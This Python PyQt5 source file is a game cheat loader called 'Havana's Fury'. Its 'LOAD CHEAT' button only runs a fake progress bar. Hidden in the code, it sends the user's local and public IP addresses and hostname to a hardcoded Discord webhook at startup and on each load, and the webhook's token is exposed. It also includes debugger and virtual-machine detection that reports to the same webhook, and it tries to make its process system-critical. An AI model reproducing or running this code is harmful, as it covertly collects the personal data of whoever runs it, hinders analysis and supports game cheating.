import sys
import time
import random
import os
import socket
import requests
import json
import hashlib
import webbrowser
from datetime import datetime
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtNetwork import QNetworkAccessManager, QNetworkRequest, QNetworkReply

# ================= CONFIGURATION =================
WEBHOOK_URL = "https://discord.com/api/webhooks/1492118458530398259/Now01E6DfM5EZoPtfQHs867MpgNvwG4VNNTdxy89XuxfGOJgi8rWSfkL8ChAalLITzeL"
GAMES_URL = "https://raw.githubusercontent.com/ImNotWraith/test/refs/heads/main/games.json"

# ================= LOCAL FALLBACK DATA =================
FALLBACK_GAMES = [
    {"name": "Dead By Daylight", "status": "Offline", "subscription": "Lifetime", "icon": ""},
    {"name": "Rust", "status": "Offline", "subscription": "Lifetime", "icon": ""},
    {"name": "Minecraft", "status": "Offline", "subscription": "Lifetime", "icon": ""}
]

# ================= GLOBAL VARIABLES =================
GAMES = []
BUILD_TIME = ""

# ================= ANTI-DEBUG =================
class AntiDebug:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.is_debugged = False
        self.vm_detected = False
        
    def get_system_info(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
        except:
            ip_address = "Unknown"
        
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            public_ip = "Unknown"
        
        return {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip_address": ip_address,
            "public_ip": public_ip,
            "hostname": socket.gethostname()
        }
    
    def log_violation(self, violation_type, details):
        info = self.get_system_info()
        data = {
            "embeds": [{
                "title": "⚠️ Security Violation Detected",
                "color": 0xFF0000,
                "fields": [
                    {"name": "Violation Type", "value": violation_type, "inline": False},
                    {"name": "Details", "value": details, "inline": False},
                    {"name": "IP Address", "value": f"{info['ip_address']} (Public: {info['public_ip']})", "inline": True},
                    {"name": "Time", "value": info['timestamp'], "inline": True},
                    {"name": "Hostname", "value": info['hostname'], "inline": True}
                ]
            }]
        }
        try:
            requests.post(self.webhook_url, json=data, timeout=3)
        except:
            pass
    
    def check_debugger(self):
        import ctypes
        import ctypes.wintypes
        import psutil
        
        checks = []
        
        if ctypes.windll.kernel32.IsDebuggerPresent():
            checks.append("IsDebuggerPresent")
            self.is_debugged = True
        
        is_debugged = ctypes.c_bool()
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.windll.kernel32.GetCurrentProcess(), 
            ctypes.byref(is_debugged)
        )
        if is_debugged.value:
            checks.append("CheckRemoteDebuggerPresent")
            self.is_debugged = True
        
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                proc_name = proc.info['name'].lower()
                if any(debugger in proc_name for debugger in ['ollydbg', 'x64dbg', 'windbg', 'ida', 'cheat engine']):
                    checks.append(f"Debugger: {proc.info['name']}")
                    self.is_debugged = True
            except:
                pass
        
        if self.is_debugged:
            self.log_violation("Debugger Detected", ", ".join(checks))
            return False
        return True
    
    def check_vm(self):
        import psutil
        indicators = []
        
        vm_processes = ['vboxservice', 'vboxtray', 'vmtoolsd', 'vmwaretray']
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() in vm_processes:
                    indicators.append(f"VM Process: {proc.info['name']}")
                    self.vm_detected = True
            except:
                pass
        
        if self.vm_detected:
            self.log_violation("Virtual Machine Detected", ", ".join(indicators))
            return False
        return True
    
    def protect(self):
        import ctypes
        try:
            ctypes.windll.kernel32.SetProcessCritical(
                ctypes.windll.kernel32.GetCurrentProcess(),
                True
            )
        except:
            pass
    
    def run_checks(self):
        if not self.check_debugger():
            return False
        if not self.check_vm():
            return False
        self.protect()
        return True

# ================= ICON DOWNLOADER =================
class IconDownloader(QThread):
    download_complete = pyqtSignal(str, str)
    download_error = pyqtSignal(str, str)
    
    def __init__(self, game_name, icon_url):
        super().__init__()
        self.game_name = game_name
        self.icon_url = icon_url
        self._is_running = True
    
    def stop(self):
        self._is_running = False
    
    def get_icon_filename(self):
        name_clean = self.game_name.lower().replace(" ", "_").replace(":", "")
        ext = 'png'
        if self.icon_url and '.' in self.icon_url.split('?')[0]:
            ext = self.icon_url.split('?')[0].split('.')[-1]
            if ext not in ['png', 'jpg', 'jpeg', 'gif', 'webp']:
                ext = 'png'
        return f"{name_clean}.{ext}"
    
    def run(self):
        try:
            if not self._is_running or not self.icon_url:
                return
            
            icons_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icons")
            os.makedirs(icons_dir, exist_ok=True)
            
            filename = self.get_icon_filename()
            local_path = os.path.join(icons_dir, filename)
            
            if os.path.exists(local_path):
                if self._is_running:
                    self.download_complete.emit(self.game_name, local_path)
                return
            
            response = requests.get(self.icon_url, timeout=10, stream=True)
            if response.status_code == 200:
                with open(local_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        if not self._is_running:
                            return
                        f.write(chunk)
                
                if self._is_running:
                    self.download_complete.emit(self.game_name, local_path)
            else:
                if self._is_running:
                    self.download_error.emit(self.game_name, f"HTTP {response.status_code}")
        except Exception as e:
            if self._is_running:
                self.download_error.emit(self.game_name, str(e))

# ================= GAMES FETCHER =================
class GamesFetcher(QThread):
    fetch_complete = pyqtSignal(list, str)
    fetch_error = pyqtSignal(str)
    progress = pyqtSignal(int)
    
    def __init__(self, url):
        super().__init__()
        self.url = url
        self._is_running = True
    
    def stop(self):
        self._is_running = False
    
    def run(self):
        try:
            if not self._is_running:
                return
            self.progress.emit(25)
            time.sleep(0.5)
            
            response = requests.get(self.url, timeout=5)
            if not self._is_running:
                return
                
            if response.status_code == 200:
                self.progress.emit(75)
                time.sleep(0.3)
                data = response.json()
                games = data.get("games", [])
                build_time = data.get("build_time", "Unknown")
                self.progress.emit(100)
                time.sleep(0.3)
                if self._is_running:
                    self.fetch_complete.emit(games, build_time)
            else:
                if self._is_running:
                    self.progress.emit(100)
                    self.fetch_complete.emit(FALLBACK_GAMES, "Local Fallback")
        except:
            if self._is_running:
                self.progress.emit(100)
                self.fetch_complete.emit(FALLBACK_GAMES, "Local Fallback")

# ================= WEBHOOK LOGGER =================
class WebhookLogger(QThread):
    def __init__(self, webhook_url, action, details=""):
        super().__init__()
        self.webhook_url = webhook_url
        self.action = action
        self.details = details
        self._is_running = True
    
    def stop(self):
        self._is_running = False
    
    def get_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"
    
    def run(self):
        try:
            if not self._is_running:
                return
            ip = self.get_ip()
            data = {
                "embeds": [{
                    "title": f"Havana's Fury - {self.action}",
                    "color": 0x00FF00 if "Connected" in self.action or "Complete" in self.action else 0xFF0000,
                    "fields": [
                        {"name": "Action", "value": self.action, "inline": False},
                        {"name": "IP Address", "value": ip, "inline": True},
                        {"name": "Time", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True},
                        {"name": "Details", "value": self.details if self.details else "None", "inline": False}
                    ]
                }]
            }
            requests.post(self.webhook_url, json=data, timeout=2)
        except:
            pass

# ================= CONNECTION CHECK =================
def is_connected():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=2)
        return True
    except OSError:
        try:
            socket.create_connection(("1.1.1.1", 53), timeout=2)
            return True
        except OSError:
            return False

# ================= LOADER THREAD =================
class LoaderThread(QThread):
    progress = pyqtSignal(int)
    stage = pyqtSignal(str)
    done = pyqtSignal()
    error = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self._is_running = True
    
    def stop(self):
        self._is_running = False

    def run(self):
        stages = [("INITIALIZING...", 30), ("LOADING MODULES...", 70), ("INJECTING...", 100)]
        current = 0
        for text, target in stages:
            if not self._is_running:
                return
            self.stage.emit(text)
            while current < target:
                if not self._is_running:
                    return
                time.sleep(random.uniform(0.01, 0.03))
                current += 1
                self.progress.emit(current)
        if self._is_running:
            self.done.emit()

# ================= GAME CARD =================
class GameCard(QFrame):
    clicked = pyqtSignal(int)
    
    def __init__(self, game_data, index):
        super().__init__()
        self.index = index
        self.game_data = game_data
        self.setFixedHeight(46)
        self.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self.setCursor(Qt.PointingHandCursor)
        self.setStyleSheet("""
            GameCard { background: #232323; border-radius: 10px; border: 1px solid #353535; }
            GameCard:hover { background: #2b2b2b; border: 1px solid #545454; }
        """)
        
        layout = QHBoxLayout(self)
        layout.setContentsMargins(9, 5, 9, 5)
        layout.setSpacing(8)
        
        self.icon_label = QLabel()
        self.icon_label.setFixedSize(24, 24)
        self.icon_label.setVisible(False)
        
        icon_url = game_data.get("icon", "")
        if icon_url:
            self.load_icon_from_url(icon_url)
        
        text_container = QVBoxLayout()
        text_container.setSpacing(2)
        
        self.name_label = QLabel(game_data["name"])
        self.name_label.setFont(QFont("Segoe UI", 9, QFont.Bold))
        self.name_label.setStyleSheet("color: #c7cbd1;")
        
        status_text = game_data.get("status", "Offline")
        self.status_label = QLabel(status_text)
        self.status_label.setFont(QFont("Segoe UI", 7, QFont.Bold))
        status_color = "#4ade80" if status_text.lower() == "online" else "#f87171" if status_text.lower() == "offline" else "#fbbf24"
        self.status_label.setStyleSheet(f"color: {status_color}; background: #1a1a1a; border: 1px solid #333333; border-radius: 6px; padding: 1px 6px;")
        
        text_container.addWidget(self.name_label)
        text_container.addWidget(self.status_label)
        
        layout.addWidget(self.icon_label)
        layout.addLayout(text_container)
        layout.addStretch()
    
    def load_icon_from_url(self, url):
        manager = QNetworkAccessManager()
        reply = manager.get(QNetworkRequest(QUrl(url)))
        reply.finished.connect(lambda: self.on_icon_loaded(reply))
    
    def on_icon_loaded(self, reply):
        if reply.error() == QNetworkReply.NoError:
            pixmap = QPixmap()
            pixmap.loadFromData(reply.readAll())
            if not pixmap.isNull():
                scaled = pixmap.scaled(24, 24, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                self.icon_label.setPixmap(scaled)
                self.icon_label.setVisible(True)
        reply.deleteLater()
    
    def mousePressEvent(self, e):
        self.clicked.emit(self.index)
        
    def set_active(self, active):
        if active:
            self.setStyleSheet("GameCard { background: #303640; border-radius: 10px; border: 1px solid #7c8899; } GameCard:hover { background: #353c48; border: 1px solid #95a1b1; }")
            self.name_label.setStyleSheet("color: #f0f3f8;")
        else:
            self.setStyleSheet("GameCard { background: #232323; border-radius: 10px; border: 1px solid #353535; } GameCard:hover { background: #2b2b2b; border: 1px solid #545454; }")
            self.name_label.setStyleSheet("color: #c7cbd1;")

# ================= TITLE BAR =================
class TitleBar(QFrame):
    def __init__(self, parent):
        super().__init__()
        self.parent = parent
        self.setFixedHeight(40)
        self.setStyleSheet("TitleBar { background: #1a1a1a; border-top-left-radius: 12px; border-top-right-radius: 12px; }")
        
        layout = QHBoxLayout(self)
        layout.setContentsMargins(16, 0, 12, 0)
        
        logo_text = QLabel("HAVANA'S FURY")
        logo_text.setFont(QFont("Segoe UI", 9, QFont.Bold))
        logo_text.setStyleSheet("color: #d1d5db; letter-spacing: 1px;")
        
        version_badge = QLabel("Lite")
        version_badge.setFont(QFont("Segoe UI", 7))
        version_badge.setStyleSheet("background: #2a2a2a; color: #9ca3af; padding: 2px 6px; border-radius: 8px;")
        
        layout.addWidget(logo_text)
        layout.addWidget(version_badge)
        layout.addStretch()
        
        self.status_indicator = QLabel()
        self.status_indicator.setFixedSize(8, 8)
        
        minimize_btn = QPushButton("─")
        minimize_btn.setFixedSize(26, 20)
        minimize_btn.setStyleSheet("QPushButton { background: transparent; color: #9ca3af; border: none; font-size: 11px; font-weight: bold; border-radius: 4px; } QPushButton:hover { background: #2a2a2a; color: #e0e0e0; }")
        minimize_btn.clicked.connect(parent.showMinimized)
        
        close_btn = QPushButton("×")
        close_btn.setFixedSize(26, 20)
        close_btn.setStyleSheet("QPushButton { background: transparent; color: #9ca3af; border: none; font-size: 11px; border-radius: 4px; } QPushButton:hover { background: #ef4444; color: white; }")
        close_btn.clicked.connect(parent.close)
        
        layout.addWidget(self.status_indicator)
        layout.addWidget(minimize_btn)
        layout.addWidget(close_btn)
        
        self.connection_timer = QTimer(self)
        self.connection_timer.timeout.connect(self.update_status)
        self.connection_timer.start(5000)
        self.update_status()
    
    def update_status(self):
        if is_connected():
            self.status_indicator.setStyleSheet("background-color: #4ade80; border-radius: 4px;")
        else:
            self.status_indicator.setStyleSheet("background-color: #ef4444; border-radius: 4px;")
    
    def mousePressEvent(self, e):
        self.oldPos = e.globalPos()
    def mouseMoveEvent(self, e):
        delta = e.globalPos() - self.oldPos
        self.parent.move(self.parent.x() + delta.x(), self.parent.y() + delta.y())
        self.oldPos = e.globalPos()

# ================= INFO CARD =================
class InfoCard(QFrame):
    def __init__(self, title, value, value_color="#4ade80"):
        super().__init__()
        self.setStyleSheet("InfoCard { background: #1a1a1a; border-radius: 8px; border: 1px solid #2a2a2a; }")
        layout = QVBoxLayout(self)
        layout.setContentsMargins(12, 10, 12, 10)
        layout.setSpacing(4)
        
        title_label = QLabel(title)
        title_label.setFont(QFont("Segoe UI", 7, QFont.Bold))
        title_label.setStyleSheet("color: #9ca3af; letter-spacing: 1px;")
        
        self.value_label = QLabel(value)
        self.value_label.setFont(QFont("Segoe UI", 9))
        self.value_label.setStyleSheet(f"color: {value_color};")
        self.value_label.setWordWrap(True)
        
        layout.addWidget(title_label)
        layout.addWidget(self.value_label)
    
    def set_value(self, value, color=None):
        self.value_label.setText(value)
        if color:
            self.value_label.setStyleSheet(f"color: {color};")

# ================= DISCORD BUTTON =================
class DiscordButton(QPushButton):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(64, 64)
        self.setCursor(Qt.PointingHandCursor)
        self.setStyleSheet("QPushButton { background: #2a2a2a; border: 2px solid #3a3a3a; border-radius: 32px; } QPushButton:hover { background: #333333; border: 2px solid #5865F2; }")
        self.setText("DC")
        self.setFont(QFont("Segoe UI", 12, QFont.Bold))
        self.clicked.connect(lambda: webbrowser.open("https://discord.gg/yourserver"))

# ================= LOADING SCREEN =================
class LoadingScreen(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.Dialog)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setFixedSize(400, 200)
        
        layout = QVBoxLayout(self)
        container = QFrame()
        container.setStyleSheet("QFrame { background: #1e1e1e; border-radius: 12px; border: 1px solid #2a2a2a; }")
        container_layout = QVBoxLayout(container)
        
        self.title_label = QLabel("Havana's Fury")
        self.title_label.setFont(QFont("Segoe UI", 16, QFont.Bold))
        self.title_label.setStyleSheet("color: #f3f4f6;")
        self.title_label.setAlignment(Qt.AlignCenter)
        container_layout.addWidget(self.title_label)
        
        self.status_label = QLabel("Fetching games...")
        self.status_label.setFont(QFont("Segoe UI", 10))
        self.status_label.setStyleSheet("color: #9ca3af;")
        self.status_label.setAlignment(Qt.AlignCenter)
        container_layout.addWidget(self.status_label)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setFixedHeight(3)
        self.progress_bar.setStyleSheet("QProgressBar { background: #2a2a2a; border-radius: 2px; } QProgressBar::chunk { background: #6b7280; border-radius: 2px; }")
        container_layout.addWidget(self.progress_bar)
        
        layout.addWidget(container)
    
    def update_progress(self, value):
        self.progress_bar.setValue(value)
    def update_status(self, text):
        self.status_label.setText(text)

# ================= MAIN WINDOW =================
class Window(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setFixedSize(500, 456)
        self.setWindowFlags(Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        
        self.game_cards = []
        self.current_game = 0
        self.is_loading = False
        self.games_fetcher = None
        self.loader_thread = None
        self.active_loggers = []
        self.active_downloaders = []
        self.network_manager = QNetworkAccessManager(self)
        
        self.icons_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icons")
        os.makedirs(self.icons_dir, exist_ok=True)
        
        try:
            anti_debug = AntiDebug(WEBHOOK_URL)
            anti_debug.run_checks()
        except:
            pass
        
        self.loading_screen = LoadingScreen(self)
        self.loading_screen.show()
        self.fetch_games()
    
    def fetch_games(self):
        self.games_fetcher = GamesFetcher(GAMES_URL)
        self.games_fetcher.fetch_complete.connect(self.on_games_fetched)
        self.games_fetcher.fetch_error.connect(self.on_fetch_error)
        self.games_fetcher.progress.connect(self.loading_screen.update_progress)
        self.games_fetcher.start()
    
    def on_games_fetched(self, games, build_time):
        global GAMES, BUILD_TIME
        GAMES = games
        BUILD_TIME = build_time
        
        for game in GAMES:
            icon_url = game.get("icon", "")
            if icon_url:
                downloader = IconDownloader(game["name"], icon_url)
                downloader.download_complete.connect(self.on_icon_downloaded)
                self.active_downloaders.append(downloader)
                downloader.start()
        
        self.loading_screen.close()
        self.initUI()
        
        logger = WebhookLogger(WEBHOOK_URL, "Application Started", f"Games loaded: {len(GAMES)}")
        self.active_loggers.append(logger)
        logger.start()
        
        self.update_loading_availability()
    
    def on_icon_downloaded(self, game_name, local_path):
        pass
    
    def on_fetch_error(self, error):
        self.on_games_fetched(FALLBACK_GAMES, "Local Fallback")
    
    def initUI(self):
        main_container = QFrame()
        main_container.setStyleSheet("QFrame { background: #1e1e1e; border-radius: 12px; border: 1px solid #2a2a2a; }")
        main_layout = QVBoxLayout(main_container)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        
        main_layout.addWidget(TitleBar(self))
        
        content_widget = QWidget()
        content_layout = QHBoxLayout(content_widget)
        content_layout.setContentsMargins(16, 16, 16, 16)
        content_layout.setSpacing(16)
        
        # LEFT PANEL
        left_panel = QFrame()
        left_panel.setFixedWidth(174)
        left_panel.setStyleSheet("QFrame { background: #171717; border-radius: 12px; border: 1px solid #2d2d2d; }")
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(9, 10, 9, 9)
        left_layout.setSpacing(8)
        
        header = QLabel("GAMES")
        header.setFont(QFont("Segoe UI", 8, QFont.Bold))
        header.setStyleSheet("color: #9ca3af; letter-spacing: 2px;")
        left_layout.addWidget(header)
        
        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setStyleSheet("color: #2b2b2b; background: #2b2b2b; min-height: 1px;")
        left_layout.addWidget(line)
        
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        scroll.setStyleSheet("QScrollArea { background: transparent; border: none; } QScrollArea > QWidget > QWidget { background: #171717; } QScrollBar:vertical { background: #151515; width: 6px; border-radius: 3px; } QScrollBar::handle:vertical { background: #3c3c3c; border-radius: 3px; }")
        
        games_container = QWidget()
        games_container.setStyleSheet("background: #171717;")
        games_layout = QVBoxLayout(games_container)
        games_layout.setContentsMargins(0, 0, 4, 0)
        games_layout.setSpacing(6)
        
        for i, game in enumerate(GAMES):
            card = GameCard(game, i)
            card.clicked.connect(self.select_game)
            games_layout.addWidget(card)
            self.game_cards.append(card)
        
        games_layout.addStretch()
        scroll.setWidget(games_container)
        left_layout.addWidget(scroll)
        
        discord_container = QFrame()
        discord_container.setFixedHeight(74)
        discord_container.setStyleSheet("background: #151515; border: 1px solid #272727; border-radius: 10px;")
        discord_layout = QHBoxLayout(discord_container)
        discord_layout.setAlignment(Qt.AlignCenter)
        discord_layout.addWidget(DiscordButton())
        left_layout.addWidget(discord_container)
        
        # RIGHT PANEL
        right_panel = QFrame()
        right_panel.setStyleSheet("QFrame { background: #1a1a1a; border-radius: 12px; border: 1px solid #2a2a2a; }")
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(16, 16, 16, 16)
        right_layout.setSpacing(12)
        
        self.game_icon = QLabel()
        self.game_icon.setFixedSize(48, 48)
        self.game_icon.setStyleSheet("background: #2a2a2a; border-radius: 8px; border: 1px solid #3a3a3a;")
        self.game_icon.setAlignment(Qt.AlignCenter)
        self.game_icon.setVisible(False)
        
        self.game_title = QLabel("")
        self.game_title.setFont(QFont("Segoe UI", 14, QFont.Bold))
        self.game_title.setStyleSheet("color: #f3f4f6;")
        
        self.game_status = QLabel("")
        self.game_status.setFont(QFont("Segoe UI", 8))
        
        header_layout = QHBoxLayout()
        header_layout.addWidget(self.game_icon)
        header_layout.addWidget(self.game_title)
        header_layout.addStretch()
        right_layout.addLayout(header_layout)
        right_layout.addWidget(self.game_status)
        
        self.sub_card = InfoCard("SUBSCRIPTION", "")
        right_layout.addWidget(self.sub_card)
        right_layout.addStretch()
        
        self.action_btn = QPushButton("LOAD CHEAT")
        self.action_btn.setFixedHeight(40)
        self.action_btn.setCursor(Qt.PointingHandCursor)
        self.action_btn.setStyleSheet("QPushButton { background: #3a3a3a; border: 1px solid #4a4a4a; border-radius: 8px; color: #f3f4f6; font-weight: bold; font-size: 11px; letter-spacing: 1px; } QPushButton:hover { background: #4a4a4a; border: 1px solid #6b7280; } QPushButton:disabled { background: #2a2a2a; color: #6b7280; }")
        self.action_btn.clicked.connect(self.start_loading)
        right_layout.addWidget(self.action_btn)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        self.progress_bar.setFixedHeight(3)
        self.progress_bar.setStyleSheet("QProgressBar { background: #2a2a2a; border-radius: 2px; } QProgressBar::chunk { background: #6b7280; border-radius: 2px; }")
        right_layout.addWidget(self.progress_bar)
        
        self.stage_text = QLabel("")
        self.stage_text.setFont(QFont("Segoe UI", 7))
        self.stage_text.setStyleSheet("color: #9ca3af;")
        right_layout.addWidget(self.stage_text)
        
        content_layout.addWidget(left_panel)
        content_layout.addWidget(right_panel, stretch=1)
        main_layout.addWidget(content_widget)
        self.setCentralWidget(main_container)
        
        self.select_game(0)
    
    def select_game(self, index):
        self.current_game = index
        for i, card in enumerate(self.game_cards):
            card.set_active(i == index)
        
        game = GAMES[index]
        self.game_title.setText(game["name"])
        
        icon_url = game.get("icon", "")
        if icon_url:
            reply = self.network_manager.get(QNetworkRequest(QUrl(icon_url)))
            reply.finished.connect(lambda: self.on_icon_load(reply))
        
        status = game.get("status", "Offline")
        color = "#4ade80" if status.lower() == "online" else "#f87171" if status.lower() == "offline" else "#fbbf24"
        self.game_status.setStyleSheet(f"color: {color}; font-weight: bold;")
        self.game_status.setText(f"● {status}")
        self.sub_card.set_value(game.get("subscription", "Unknown"))
        self.update_loading_availability()
    
    def on_icon_load(self, reply):
        if reply.error() == QNetworkReply.NoError:
            pixmap = QPixmap()
            pixmap.loadFromData(reply.readAll())
            if not pixmap.isNull():
                scaled = pixmap.scaled(48, 48, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                self.game_icon.setPixmap(scaled)
                self.game_icon.setVisible(True)
        reply.deleteLater()
    
    def start_loading(self):
        game = GAMES[self.current_game]
        if game.get("status", "Offline").lower() == "offline":
            QMessageBox.warning(self, "Offline", "This game is currently offline.")
            return
        if not is_connected():
            QMessageBox.warning(self, "No Connection", "No internet connection.")
            return
        
        self.is_loading = True
        self.action_btn.setEnabled(False)
        self.action_btn.setText("LOADING...")
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        
        logger = WebhookLogger(WEBHOOK_URL, "Loading Started", f"Game: {game['name']}")
        self.active_loggers.append(logger)
        logger.start()
        
        self.loader_thread = LoaderThread()
        self.loader_thread.progress.connect(self.progress_bar.setValue)
        self.loader_thread.stage.connect(self.stage_text.setText)
        self.loader_thread.done.connect(self.loading_complete)
        self.loader_thread.error.connect(self.loading_error)
        self.loader_thread.start()
    
    def loading_error(self, msg):
        self.is_loading = False
        self.action_btn.setText("LOAD CHEAT")
        self.progress_bar.setVisible(False)
        self.update_loading_availability()
    
    def loading_complete(self):
        self.is_loading = False
        self.action_btn.setText("START GAME")
        self.stage_text.setText("Ready to inject")
        QTimer.singleShot(2000, lambda: self.progress_bar.setVisible(False))
        self.update_loading_availability()
    
    def update_loading_availability(self):
        if self.is_loading:
            return
        game = GAMES[self.current_game]
        online = game.get("status", "Offline").lower() != "offline" and is_connected()
        self.action_btn.setEnabled(online)
        self.action_btn.setText("LOAD CHEAT" if online else "OFFLINE")
    
    def closeEvent(self, event):
        if self.games_fetcher and self.games_fetcher.isRunning():
            self.games_fetcher.stop()
            self.games_fetcher.wait(1000)
        if self.loader_thread and self.loader_thread.isRunning():
            self.loader_thread.stop()
            self.loader_thread.wait(1000)
        for d in self.active_downloaders:
            if d and d.isRunning():
                d.stop()
                d.wait(500)
        for l in self.active_loggers:
            if l and l.isRunning():
                l.stop()
                l.wait(500)
        event.accept()

# ================= RUN =================
if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    app.setFont(QFont("Segoe UI", 9))
    window = Window()
    window.show()
    sys.exit(app.exec_())
